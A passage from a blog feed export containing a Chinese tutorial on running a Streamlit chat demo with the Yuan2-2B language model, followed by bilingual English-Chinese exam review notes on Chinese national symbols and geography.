<li><strong>稳定性与安全性</strong>： 专业团队管理，可能提供更好的系统稳定性和数据安全性措施。</li>
<li><strong>扩展性</strong>： API服务易于集成到现有的应用和服务中，支持高并发请求。</li>
</ol>
</li>
<li>✖️ 缺点：
<ol>
<li><strong>网络延迟</strong>： 需要稳定的网络连接，可能会受到网络延迟的影响。</li>
<li><strong>数据隐私</strong>： 数据需要传输到服务商的服务器，可能涉及数据安全和隐私问题。</li>
<li><strong>成本控制</strong>： 高频次或大量数据的调用可能会导致较高的费用。</li>
<li><strong>依赖性</strong>： 受制于服务商的政策变化，如价格调整、服务条款变更等。</li>
</ol>
</li>
</ul>
<h6 id="大模型本地部署"><a class="header-anchor" href="#大模型本地部署">¶</a>大模型本地部署</h6>
<ul>
<li><strong>在本地GPU或者CPU上，下载模型文件，并基于推理框架进行部署大模型</strong></li>
<li>✔️ 优点：
<ol>
<li><strong>数据主权</strong>： 数据完全在本地处理，对于敏感数据处理更为安全。</li>
<li><strong>性能可控</strong>： 可以根据需求优化配置，减少网络延迟，提高响应速度。</li>
<li><strong>成本固定</strong>： 初始投入后，长期运行成本相对固定，避免了按使用量付费的不确定性。</li>
<li><strong>定制化</strong>： 更容易针对特定需求进行模型微调或扩展。</li>
</ol>
</li>
<li>✖️ 缺点：
<ol>
<li><strong>硬件投资</strong>： 需要强大的计算资源，如高性能GPU，初期投资成本较高。</li>
<li><strong>运维复杂</strong>： 需要自行管理模型的更新、维护和故障排查。</li>
<li><strong>技术门槛</strong>： 对于非专业团队而言，模型的部署和优化可能较为复杂。</li>
<li><strong>资源利用率</strong>： 在低负载情况下，本地硬件资源可能无法充分利用。</li>
</ol>
</li>
</ul>
<h6 id="选哪种"><a class="header-anchor" href="#选哪种">¶</a>选哪种</h6>
<p>选择哪种方式取决于具体的应用场景、数据敏感性、预算以及对延迟和性能的需求</p>
<h3 id="baseline精读"><a class="header-anchor" href="#baseline精读">¶</a>baseline精读</h3>
<h4 id="完整代码"><a class="header-anchor" href="#完整代码">¶</a>完整代码</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入所需的库</span></span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModelForCausalLM</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> streamlit <span class="keyword">as</span> st</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个标题和一个副标题</span></span><br><span class="line">st.title(<span class="string">&quot;💬 Yuan2.0 智能编程助手&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 源大模型下载</span></span><br><span class="line"><span class="keyword">from</span> modelscope <span class="keyword">import</span> snapshot_download</span><br><span class="line">model_dir = snapshot_download(<span class="string">&#x27;IEITYuan/Yuan2-2B-Mars-hf&#x27;</span>, cache_dir=<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line"><span class="comment"># model_dir = snapshot_download(&#x27;IEITYuan/Yuan2-2B-July-hf&#x27;, cache_dir=&#x27;./&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义模型路径</span></span><br><span class="line">path = <span class="string">&#x27;./IEITYuan/Yuan2-2B-Mars-hf&#x27;</span></span><br><span class="line"><span class="comment"># path = &#x27;./IEITYuan/Yuan2-2B-July-hf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义模型数据类型</span></span><br><span class="line">torch_dtype = torch.bfloat16 <span class="comment"># A10</span></span><br><span class="line"><span class="comment"># torch_dtype = torch.float16 # P100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数，用于获取模型和tokenizer</span></span><br><span class="line"><span class="meta">@st.cache_resource</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_model</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Creat tokenizer...&quot;</span>)</span><br><span class="line">    tokenizer = AutoTokenizer.from_pretrained(path, add_eos_token=<span class="literal">False</span>, add_bos_token=<span class="literal">False</span>, eos_token=<span class="string">&#x27;&lt;eod&gt;&#x27;</span>)</span><br><span class="line">    tokenizer.add_tokens([<span class="string">&#x27;&lt;sep&gt;&#x27;</span>, <span class="string">&#x27;&lt;pad&gt;&#x27;</span>, <span class="string">&#x27;&lt;mask&gt;&#x27;</span>, <span class="string">&#x27;&lt;predict&gt;&#x27;</span>, <span class="string">&#x27;&lt;FIM_SUFFIX&gt;&#x27;</span>, <span class="string">&#x27;&lt;FIM_PREFIX&gt;&#x27;</span>, <span class="string">&#x27;&lt;FIM_MIDDLE&gt;&#x27;</span>,<span class="string">&#x27;&lt;commit_before&gt;&#x27;</span>,<span class="string">&#x27;&lt;commit_msg&gt;&#x27;</span>,<span class="string">&#x27;&lt;commit_after&gt;&#x27;</span>,<span class="string">&#x27;&lt;jupyter_start&gt;&#x27;</span>,<span class="string">&#x27;&lt;jupyter_text&gt;&#x27;</span>,<span class="string">&#x27;&lt;jupyter_code&gt;&#x27;</span>,<span class="string">&#x27;&lt;jupyter_output&gt;&#x27;</span>,<span class="string">&#x27;&lt;empty_output&gt;&#x27;</span>], special_tokens=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Creat model...&quot;</span>)</span><br><span class="line">    model = AutoModelForCausalLM.from_pretrained(path, torch_dtype=torch_dtype, trust_remote_code=<span class="literal">True</span>).cuda()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Done.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> tokenizer, model</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载model和tokenizer</span></span><br><span class="line">tokenizer, model = get_model()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初次运行时，session_state中没有&quot;messages&quot;，需要创建一个空列表</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;messages&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> st.session_state:</span><br><span class="line">    st.session_state[<span class="string">&quot;messages&quot;</span>] = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每次对话时，都需要遍历session_state中的所有消息，并显示在聊天界面上</span></span><br><span class="line"><span class="keyword">for</span> msg <span class="keyword">in</span> st.session_state.messages:</span><br><span class="line">    st.chat_message(msg[<span class="string">&quot;role&quot;</span>]).write(msg[<span class="string">&quot;content&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果用户在聊天输入框中输入了内容，则执行以下操作</span></span><br><span class="line"><span class="keyword">if</span> prompt := st.chat_input():</span><br><span class="line">    <span class="comment"># 将用户的输入添加到session_state中的messages列表中</span></span><br><span class="line">    st.session_state.messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: prompt&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在聊天界面上显示用户的输入</span></span><br><span class="line">    st.chat_message(<span class="string">&quot;user&quot;</span>).write(prompt)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用模型</span></span><br><span class="line">    prompt = <span class="string">&quot;&lt;n&gt;&quot;</span>.join(msg[<span class="string">&quot;content&quot;</span>] <span class="keyword">for</span> msg <span class="keyword">in</span> st.session_state.messages) + <span class="string">&quot;&lt;sep&gt;&quot;</span> <span class="comment"># 拼接对话历史</span></span><br><span class="line">    inputs = tokenizer(prompt, return_tensors=<span class="string">&quot;pt&quot;</span>)[<span class="string">&quot;input_ids&quot;</span>].cuda()</span><br><span class="line">    outputs = model.generate(inputs, do_sample=<span class="literal">False</span>, max_length=<span class="number">1024</span>) <span class="comment"># 设置解码方式和最大生成长度</span></span><br><span class="line">    output = tokenizer.decode(outputs[<span class="number">0</span>])</span><br><span class="line">    response = output.split(<span class="string">&quot;&lt;sep&gt;&quot;</span>)[-<span class="number">1</span>].replace(<span class="string">&quot;&lt;eod&gt;&quot;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将模型的输出添加到session_state中的messages列表中</span></span><br><span class="line">    st.session_state.messages.append(&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: response&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在聊天界面上显示模型的输出</span></span><br><span class="line">    st.chat_message(<span class="string">&quot;assistant&quot;</span>).write(response)</span><br></pre></td></tr></table></figure>
<h4 id="方案设计"><a class="header-anchor" href="#方案设计">¶</a>方案设计</h4>
<h5 id="概要"><a class="header-anchor" href="#概要">¶</a>概要</h5>
<ul>
<li>baseline基于源大模型的编程能力来解决用户的问题</li>
<li>主要包含：一个Streamlit开发的客户端，一个部署好浪潮源大模型的服务端</li>
<li>客户端接收到用户请求后，首先进行交互历史拼接，然后输入到服务端的浪潮源大模型，得到模型输出结果后，返回给客户端，用于回复用户的问题</li>
</ul>
<h5 id="详细设计"><a class="header-anchor" href="#详细设计">¶</a>详细设计</h5>
<table>
<thead>
<tr>
<th>导入库↓</th>
<th>导入所需要的依赖，包括 <code>transformers</code>，<code>torch</code> 和 <code>streamlit</code>。其中<code>torch</code> 魔搭本身已经安装，<code>transformers</code> 和 <code>streamlit</code>在第二步也安装完毕</th>
</tr>
</thead>
<tbody>
<tr>
<td>模型下载↓</td>
<td>Yuan2-2B-Mars支持通过多个平台进行下载，包括魔搭、HuggingFace、OpenXlab、百度网盘、WiseModel等。因为我们的机器就在魔搭，所以这里我们直接选择通过魔搭进行下载。模型在魔搭平台的地址为 <a href="https://modelscope.cn/models/IEITYuan/Yuan2-2B-Mars-hf">IEITYuan/Yuan2-2B-Mars-hf</a>。                                                                                                                   模型下载使用的是 modelscope 中的 snapshot_download 函数，第一个参数为模型名称 <code>IEITYuan/Yuan2-2B-Mars-hf</code>，第二个参数 <code>cache_dir</code> 为模型保存路径，这里<code>.</code>表示当前路径。                                                                                                模型大小约为4.1G，由于是从魔搭直接进行下载，速度会非常快。下载完成后，会在当前目录增加一个名为 <code>IEITYuan</code> 的文件夹，其中 <code>Yuan2-2B-Mars-hf</code> 里面保存着我们下载好的源大模型。</td>
</tr>
<tr>
<td>模型加载↓</td>
<td>使用 <code>transformers</code> 中的 <code>from_pretrained</code> 函数来加载下载好的模型和tokenizer，并通过 <code>.cuda()</code> 将模型放置在GPU上。另外，这里额外使用了 <code>streamlit</code> 提供的一个装饰器 <code>@st.cache_resource</code> ，它可以用于缓存加载好的模型和tokenizer</td>
</tr>
<tr>
<td>读取用户输入↓</td>
<td>使用 <code>streamlit</code> 提供的 <code>chat_input()</code> 来获取用户输入，同时将其保存到对话历史里，并通过<code>st.chat_message(&quot;user&quot;).write(prompt)</code> 在聊天界面上进行显示</td>
</tr>
<tr>
<td><strong>对话历史拼接</strong>↓</td>
<td>对于 <code>Yuan2-2B-Mars</code> 模型来说，输入需要在末尾添加 <code>&lt;sep&gt;</code>，模型输出到 <code>&lt;eod&gt;</code> 结束。如果输入是多轮对话历史，需要使用 <code>&lt;n&gt;</code> 进行拼接，并且在末尾添加 <code>&lt;sep&gt;</code></td>
</tr>
<tr>
<td><strong>模型调用</strong>↓</td>
<td>输入的prompt需要先经tokenizer切分成token，并转成对应的id，并通过 <code>.cuda()</code> 将输入也放置在GPU上。然后调用 <code>model.generate()</code> 生成输出的id，并通过 <code>tokenizer.decode()</code> 将id转成对应的字符串。最后从字符串中提取模型生成的内容（即 <code>&lt;sep&gt;</code> 之后的字符串），并删除末尾的 <code>&lt;eod&gt;</code> ，得到最终的回复内容</td>
</tr>
<tr>
<td>显示模型输出</td>
<td>得到回复内容后，将其保存到对话历史里，并通过<code>st.chat_message(&quot;assistant&quot;).write(response)</code> 在聊天界面上进行显示</td>
</tr>
</tbody>
</table>
<h3 id="尝试替换其他大模型"><a class="header-anchor" href="#尝试替换其他大模型">¶</a>尝试替换其他大模型</h3>
<ul>
<li>浪潮信息源大模型上新：<a href="https://modelscope.cn/models/IEITYuan/Yuan2-2B-July-hf">Yuan2-2B-July-hf</a>，只需简单三步即可体验：
<ul>
<li>双击打开baseline文件 <code>AICamp_yuan_baseline/Task\ 1：零基础玩转源大模型/web_demo_2b.py</code></li>
<li>将其中 <code># 源大模型下载</code> 和 <code># 定义模型路径</code> 的地址修改为对应的模型即可</li>
<li>在终端重新 <code>启动Demo</code></li>
</ul>
</li>
</ul>
<h4 id="代码替换"><a class="header-anchor" href="#代码替换">¶</a>代码替换</h4>
<ul>
<li>替换前</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 源大模型下载</span></span><br><span class="line"><span class="keyword">from</span> modelscope <span class="keyword">import</span> snapshot_download</span><br><span class="line">model_dir = snapshot_download(<span class="string">&#x27;IEITYuan/Yuan2-2B-Mars-hf&#x27;</span>, cache_dir=<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义模型路径</span></span><br><span class="line">path = <span class="string">&#x27;./IEITYuan/Yuan2-2B-Mars-hf&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>替换模型后</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 源大模型下载</span></span><br><span class="line"><span class="keyword">from</span> modelscope <span class="keyword">import</span> snapshot_download</span><br><span class="line">model_dir = snapshot_download(<span class="string">&#x27;IEITYuan/Yuan2-2B-July-hf&#x27;</span>, cache_dir=<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义模型路径</span></span><br><span class="line">path = <span class="string">&#x27;./IEITYuan/Yuan2-2B-July-hf&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在终端重新启动Demo</li>
</ul>
<blockquote>
<p>点击终端，然后输入如下命令，回车运行！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">streamlit run AICamp_yuan_baseline/Task\ 1：零基础玩转源大模型/web_demo_2b.py --server.address 127.0.0.1 --server.port 6006</span><br></pre></td></tr></table></figure>
</blockquote>
]]></content>
      <categories>
        <category>notes</category>
        <category>AI notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>【期末复习摘录】中国传统文化概况</title>
    <url>/2024/08/01/EnglishResources/%E3%80%90%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E6%91%98%E5%BD%95%E3%80%91%E4%B8%AD%E5%9B%BD%E4%BC%A0%E7%BB%9F%E6%96%87%E5%8C%96%E6%A6%82%E5%86%B5/</url>
    <content><![CDATA[<h3 id="翻译"><a class="header-anchor" href="#翻译">¶</a>翻译</h3>
<ul>
<li>长难句：
<ul>
<li>“最xxx”：带有性质的这个分句为主句，时间/地点等为状语/分句
<ul>
<li>例1：春节是中国农历年的岁首（分），<u>是最隆重的传统节日（主）</u>。
<ul>
<li>The Spring Festival is China’s most important traditional festival that falls on the first day of the first lunar month.</li>
</ul>
</li>
</ul>
</li>
<li>没有明确物体主语：用被动句
<ul>
<li>例1：但其实中国古代在天文、数学、中医等方面也取得了巨大的成就。（没有明确的主语，用“中国古代“作为主语不正确）
<ul>
<li>However, in ancient China, <u>great achievements were also made</u> in astronomy, mathematics, traditional Chinese medicine and so on.</li>
</ul>
</li>
</ul>
</li>
<li>在“例如”句中的列举项：尽可能用动名词短语来代替动词短语
<ul>
<li>例1：春节的习俗很多，如放鞭炮、贴春联、拜大年、吃饺子等。
<ul>
<li>There are many customs observed during this festival such as burning firecrackers, pasting Spring Festival couplets, paying New Year visits, eating dumplings, etc.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1>中国传统文化概况</h1>
<h2 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h2>
<ul>
<li>争取做有效的笔记</li>
</ul>
<h1>Overview</h1>
<ul>
<li>
<p>China is a vast land with various landforms, different <u>climate zone</u>s and a large number of rivers and lakes.</p>
<blockquote>
<p>中国幅员辽阔，地形多样，<u>气候带</u>不同，江河湖泊众多。</p>
</blockquote>
</li>
<li>
<p>As one of the four oldest recorded civilizations in the world, China has a long history without being interrupted.</p>
<blockquote>
<p>中国是世界四大文明古国之一，历史源远流长，从未中断。</p>
</blockquote>
</li>
<li>
<p>From ancient times till now, Chinese people, consisting of the Han and other <u>ethnic group</u>s, have been living on the vast land, creating and developing her unique culture.</p>
<blockquote>
<p>从古代到现在，中国人民，包括汉族和其他<u>民族</u>，一直生活在广阔的土地上，创造和发展她独特的文化。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>基本就是一些中国中国传统文化的概况</p>
</blockquote>
<h2 id="A-Glimpse-of-Chinese-culture"><a class="header-anchor" href="#A-Glimpse-of-Chinese-culture">¶</a>A Glimpse of Chinese culture</h2>
<h3 id="National-Day"><a class="header-anchor" href="#National-Day">¶</a>National Day</h3>
<ul>
<li>
<p>The Chinese celebrate 1 October as <u>the National Day</u> in honour of the founding of <u>the People’s Republic of China(PRC)</u> on 1 October 1949.</p>
<blockquote>
<p>中国人庆祝10月1日为<u>国庆节</u>，以纪念1949年10月1日<u>中华人民共和国</u>的成立。</p>
</blockquote>
</li>
</ul>
<h3 id="National-Flag"><a class="header-anchor" href="#National-Flag">¶</a>National Flag</h3>
<ul>
<li>
<p>On 27 September 1949, the CPPCC (中国人民政治协商会议) approved the proposal for using <u>the Five-Starred Red Flag</u> as the National Flag of the PRC.</p>
<blockquote>
<p>1949年9月27日，中国人民政治协商会议通过了关于使用<u>五星红旗</u>作为中华人民共和国国旗的建议。</p>
</blockquote>
</li>
<li>
<p>The <strong>red</strong> colour of the flag symbolizes <strong>revolution</strong> and the <strong>yellow</strong> colour of the stars the golden brilliant rays radiating from the vast red land.</p>
<blockquote>
<p>国旗的红色象征着革命，星星的黄色象征着从广袤的红色土地上放射出的金色光芒。</p>
</blockquote>
</li>
<li>
<p>The design of four smaller stars surrounding a bigger one signifies <u>the unity of the Chinese people under the leadership of the Communist Party of China(CPC)</u>.</p>
<blockquote>
<p>四颗小星星围绕着一颗大星星的设计，象征着<u>中国共产党领导下的中国人民的团结</u>。</p>
</blockquote>
</li>
</ul>
<h3 id="National-Emblem"><a class="header-anchor" href="#National-Emblem">¶</a>National Emblem</h3>
<blockquote>
<p>国徽</p>
</blockquote>
<ul>
<li>
<p>Composed of patterns of the National Flag, <u>the Tian’anmen Gate</u>, a cogwheel and ears of grain, it symbolizes <u>the New Democratic Revolution</u> of the Chinese people since <u>the 4 May Movement</u> in 1919 and the birth of New China under the people’s democratic dictatorship led by <u>the working class</u> on the basis of the worker-peasant alliance.</p>
<blockquote>
<p>它由国旗、<u>天安门</u>、齿轮和麦穗图案组成，象征着1919年<u>五四运动</u>以来中国人民的<u>新民主主义革命</u>和在<u>工人阶级</u>领导的工农联盟基础上的人民民主专政下新中国的诞生。</p>
</blockquote>
</li>
</ul>
<h3 id="National-Anthem"><a class="header-anchor" href="#National-Anthem">¶</a>National Anthem</h3>
<blockquote>
<p>国歌</p>
</blockquote>
<ul>
<li>
<p><u><em>March of the Volunteers</em></u> was written in 1935 with lyrics by the poet Tian Han and music by the composer Nie Er, honouring those who went to the front to fight the Japanese invaders in northeast China in the 1930s.</p>
<blockquote>
<p><u>《义勇军进行曲》</u>创作于1935年，由诗人田汉作词，作曲家聂耳作曲，以纪念上世纪30年代在东北抗击日本侵略者的先烈。</p>
</blockquote>
</li>
</ul>
<h3 id="National-Capital"><a class="header-anchor" href="#National-Capital">¶</a>National Capital</h3>
<ul>
<li>
<p>Beijing is not only the nation’s political centre, but also serves as its economic, scientific, cultural and educational heart.</p>
<blockquote>
<p>北京不仅是国家的政治中心，而且是经济、科学、文化和教育的心脏。</p>
</blockquote>
</li>
<li>
<p>As one of the famous ancient capital cities in China, Beijing is famous for its many places of historic interest and scenic beauty, like <u>the Forbidden City</u>, the largest and best-preserved collection of ancient buildings in China;</p>
<blockquote>
<p>作为中国著名的古都之一，北京以其众多的名胜古迹和美丽的风景而闻名，如<u>紫禁城</u>，它是中国最大和保存最完好的古建筑集合;</p>
</blockquote>
</li>
<li>
<p><u>the Temple of Heaven</u>, a platform for the Ming and Qing emperors to perform sacrifices and solemn rites;</p>
<blockquote>
<p><u>天坛</u>，明清皇帝祭祀和举行庄严仪式的平台;</p>
</blockquote>
</li>
<li>
<p><u>the Summer Palace</u>;</p>
<blockquote>
<p>颐和园</p>
</blockquote>
</li>
<li>
<p><u>the Ming Tombs;</u></p>
<blockquote>
<p>明十三陵</p>
</blockquote>
</li>
<li>
<p><u>the Badaling section of the Great Wall</u></p>
<blockquote>
<p>八达岭长城</p>
</blockquote>
</li>
</ul>
<h2 id="Geography"><a class="header-anchor" href="#Geography">¶</a>Geography</h2>
<h3 id="Location-and-Boundary"><a class="header-anchor" href="#Location-and-Boundary">¶</a>Location and Boundary</h3>
<ul>
<li>
<p>Located in the east of the Asian continent, on the western shore of the Pacific Ocean, the PRC has a land area of about 9.6 million square kilometers, and is the third largest country in the world, <u>next only to</u> Russia and Canada.</p>
<blockquote>
<p>中华人民共和国位于亚洲大陆东部，太平洋西岸，陆地面积约960万平方公里，是世界第三大国，<u>仅次于</u>俄罗斯和加拿大。</p>
</blockquote>
</li>
<li>
<p>From north to south, the territory of China stretches from the midpoint of the Heilongjiang River, north of the town of Mohe, to Zengmu’ansha at the southernmost tip of the Nansha Islands.</p>
<blockquote>
<p>中国的领土从北到南，从黑龙江中点漠河以北，一直延伸到南沙群岛最南端的曾母暗沙。</p>
</blockquote>
</li>
<li>
<p>From west to east, the country extends from its westernmost point on the Pamir Plateau to the confluence of the Heilongjiang River and Wusulijiang River.</p>
<blockquote>
<p>从西向东，从最西端的帕米尔高原一直延伸到黑龙江和乌苏里江的汇合处。</p>
</blockquote>
</li>
<li>
<p>China <u>is bordered by</u> the Democratic People’s Republic of Korea, Mongolia, Russia, Kazakhstan, …</p>
<blockquote>
<p>中国<u>与</u>朝鲜民主主义人民共和国、蒙古、俄罗斯、哈萨克斯坦、<u>…接壤</u></p>
</blockquote>
</li>
<li>
<p>The Chinese mainland is flanked to the east and south by the Bohai Sea, Yellow Sea, East China Sea and South China Sea.</p>
<blockquote>
<p>中国大陆东、南环渤海、黄海、东海和南海。</p>
</blockquote>
</li>
<li>
<p>A total of 5,400 islands <u>scatter across the seas</u>. The largest of these is the Taiwan Island. The Diaoyu Island and Chiwei Island are located to the northeast of the Taiwan Island. China;s southernmost island groups are called the Dongsha, Xisha, Zhongsha, Nansha and Zengmu’ansha.</p>
<blockquote>
<p><u>分布在海上</u>的岛屿共有5400个。其中最大的是台湾岛。钓鱼岛和赤尾岛位于台湾岛的东北部。中国最南端的群岛被称为东沙、西沙、中沙、南沙和曾母暗沙。</p>
</blockquote>
</li>
</ul>
<h3 id="Topography"><a class="header-anchor" href="#Topography">¶</a>Topography</h3>
<blockquote>
<p>地形</p>
</blockquote>
<ul>
<li>
<p>China is a country of <u>varied topographical features</u> with highlands in the west and plains in the east.</p>
<blockquote>
<p>中国是一个<u>地形多样</u>的国家，西部是高地，东部是平原。</p>
</blockquote>
</li>
<li>
<p>Mountainous land and very rough terrains make up about 67%of Chinese territory, basins and plains about 33%.</p>
<blockquote>
<p>山地和极其崎岖的地形占中国国土面积的67%，盆地和平原约占33%。</p>
</blockquote>
</li>
<li>
<p><u>Taking a bird’s-eye view of China</u>, the terrain gradually descends from west to east like four steps of a staircase.</p>
<blockquote>
<p><u>鸟瞰中国</u>，地形从西向东逐渐下降，就像有四个台阶的阶梯	。</p>
</blockquote>
</li>
<li>
<p>The first step is the Qinghai-Tibet Plateau in southwest China. With an average elevation of between 4,000 metres and 5,000 metres, it is known as the “roof of the world”.Its highest peak is called <u>Mount Qomolangma</u>. The surrounding snow-capped mountains are the origins of many of China’s large rivers.</p>
<blockquote>
<p>第一级阶梯是中国西南部的青藏高原。其平均海拔在4000米到5000米之间，被称为“世界屋脊”。它的最高峰被称为珠穆朗玛峰，周围的雪山是中国许多大河的源头。</p>
</blockquote>
</li>
<li>
<p>The second step includes the Inner Mongolia Plateau, Loess Plateau (黄土高原), Yunnan-Guizhou Plateau, Tarim Basin, Junggar Basin and Sichuan Basin, with an <u>average elevation</u> of between 1,000 metres and 2,000 metres.</p>
<blockquote>
<p>第二级阶梯包括内蒙古高原、黄土高原、云贵高原、塔里木盆地、准噶尔盆地和四川盆地，<u>平均海拔</u>在1000米至2000米之间。</p>
</blockquote>
</li>
<li>
<p>The third step, dropping to 500-1,000 metres in elevation, begins at a line drawn around the Greater Hinggan, Taihang, Wushan and Xuefeng mountain ranges and extends eastwards to the coast of the Pacific Ocean. Here, from north to south, are the Northeast Plain, North China Plain and Middle-Lower Yangtze Plain. Interspersed amongst the plains are hills and foothills.</p>
<blockquote>
<p>第三级阶梯海拔500- 1000米，从大兴安岭、太行山、巫山和雪峰山脉开始，向东延伸到太平洋沿岸。这里从北向南依次为东北平原、华北平原和长江中下游平原。在平原之间散布着小山和丘陵。</p>
</blockquote>
</li>
<li>
<p>East of the third step is the fourth step of the staircase formed by the shallow waters of the continental shelf, an extension of the land into the ocean. The water here is mostly less than 200 metres deep.</p>
<blockquote>
<p>第三级台阶的东面是由大陆架浅水形成的第四级台阶，这是陆地进入海洋的延伸。这里的水大多不到200米深。</p>
</blockquote>
</li>
</ul>
<h3 id="Rivers-and-Lakes"><a class="header-anchor" href="#Rivers-and-Lakes">¶</a>Rivers and Lakes</h3>
<ul>
<li>
<p>China abounds with rivers. Most of the large rivers have their source on the <u>Qinghai-Tibet Plateau</u>, and drop greatly between source and mouth. As a result, China is rich in <u>water-power resources</u>, leading the world in hydropower potential.</p>
<blockquote>
<p>中国河流众多。大部分大河的源头都在青藏高原，从源头到河口之间的落差很大。因此，中国水电资源丰富，水电潜力居世界首位。</p>
</blockquote>
</li>
<li>
<p>China’s rivers can be categorized as exterior and interior systems. The catchment area (汇水面积) of the <u>exterior river</u>s that empty into the oceans accounts for 64% of the country’s total land area. The catchment area of the <u>interior river</u>s that flow into inland lakes or disappear into deserts or salt marshes (沼泽地) makes up about 36% of China’s total land area.</p>
<blockquote>
<p>中国的河流可分为外流河和内流河。流入海洋的<u>外流河</u>的汇水面积占该国陆地总面积的64%。流入内陆湖或消失于沙漠或盐沼的<u>内陆河</u>的沼泽地约占中国陆地总面积的36%。</p>
</blockquote>
</li>
<li>
<p><u>The Yangtze River</u> is the longest river in China (6,300 kilometres), and the third longest river in the world. Its source is in the Tanggula Mountains on the Qinghai-Tibet Plateau. It flows through 11 provinces, autonomous regions and municipalities (直辖市). The Yangtze River is one of the main arteries of <u>water transportation</u> between eastern and western China. Many important ports and economic centres are located along it.</p>
<blockquote>
<p><u>长江</u>是中国最长的河流(6300公里)，也是世界上第三长的河流。它起源于青藏高原的唐古拉山。流经11个省、自治区、直辖市(直辖市)。长江是中国东西部<u>水运</u>的大动脉之一。许多重要的港口和经济中心都位于它的沿线。</p>
</blockquote>
</li>
<li>
<p>China’s second longest river, <u>the Yellow River</u>, originates in Qinghai province and flows 5,464 kilometres to the Bohai Sea. As the most heavily silt-laden river in the world, the Yellow River has formed a <u>raised-bed river</u> (地上河) in the lower reaches. The Yellow River is seen as <u>the cradle of Chinese civilization</u> and <u>the spiritual home of the Chinese people</u>.</p>
<blockquote>
<p><u>黄河</u>是中国第二大河，发源于青海省，全长5464公里，最终流入渤海。黄河是世界上含沙量最大的河流，在下游形成了<u>地上河</u>。黄河被视为<u>中华文明的摇篮</u>和<u>中华民族的精神家园</u>。</p>
</blockquote>
</li>
<li>
<p>Scattered throughout China are more than 2,800 natural lakes each having a surface area of over one square kilometre. Most of which are found on <u>the Middle-Lower Yangtze Plain</u> and Qinghai-Tibet Plateau. Freshwater lakes such as the Poyang Lake, Dongting Lake, Taihu Lake, and Hongze Lake mostly lie in the former area, while in the latter are saltwater lakes such as the Qinghai Lake and Nam Co Lake (纳木错湖). The Poyang Lake, in the north of Jiangxi province, is the largest of its kind. The Qinghai Lake, in northeast Qinghai province, is the largest of its kind.</p>
<blockquote>
<p>中国各地分布着2800多个天然湖泊，每个湖泊的面积都超过一平方公里。主要分布在长江中下游平原和青藏高原。鄱阳湖、洞庭湖、太湖、洪泽湖等淡水湖多位于前者，后者则是青海湖、纳木错湖等咸水湖。最大的淡水湖是位于江西省北部的鄱阳湖。最大的咸水湖是位于青海省东北部的青海湖。</p>
</blockquote>
</li>
<li>
<p>Apart from the natural rivers and lakes, there are also many manmade canals. The most famous is the Grand Canal (大运河) between Beijing and Hangzhou, more than 1,700 kilometres in length. It passes through two cities (Beijing and Tianjin)  and four provinces (Hebei, Shandong, Jiangsu and Zhejiang) and links five major rivers: the Haihe River, the Yellow River, the Huaihe River, the Yangtze River and the Qiantangjiang River. The canal was open to navigation over 1,000 years ago. It played an important role in facilitating trade between the south and the north and was regarded as the country’s transportation and information “highway” before the advent of the railway.</p>
<blockquote>
<p>除了天然的河流和湖泊，还有许多人工运河。最著名的是连接北京和杭州的全长1700多公里的京杭大运河。它穿过两个城市(北京和天津)和四个省(河北、山东、江苏和浙江)，连接五条主要河流:海河、黄河、淮河、长江和钱塘江。这条运河在1000多年前就开放通航了。它在促进南北贸易方面发挥了重要作用，在铁路出现之前被视为国家的交通和信息“高速公路”。</p>
</blockquote>
</li>
<li>
<p>Today, some of the canal’s sections have been widened, deepened or straightened out, and some water conservancy and ship locks have been added. This old canal still provides water transportation from north to south, irrigation water for the farmland on both sides, and cruise tours to the travellers from home and abroad.</p>
<blockquote>
<p>现在运河的一些路段被加宽、加深或拉直，并增加了一些水利和船闸。这条古老的运河至今仍为南北提供水运，为两岸农田提供灌溉用水，并为国内外游客提供游船旅游。</p>
